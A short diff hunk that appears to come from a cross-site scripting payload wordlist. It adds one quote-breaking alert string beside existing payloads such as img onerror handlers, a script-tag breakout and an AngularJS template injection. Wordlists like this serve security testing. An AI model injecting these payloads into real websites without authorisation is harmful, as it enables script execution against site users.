@@ -127,6 +127,7 @@ ${alert(1)}
 <><img src=1 onerror=alert(1)>
 \"-alert(1)}//
 </script><img src=1 onerror=alert(document.domain)>
+\';alert(1)//
 
 //angular
 {{$on.constructor('alert(1)')()}}
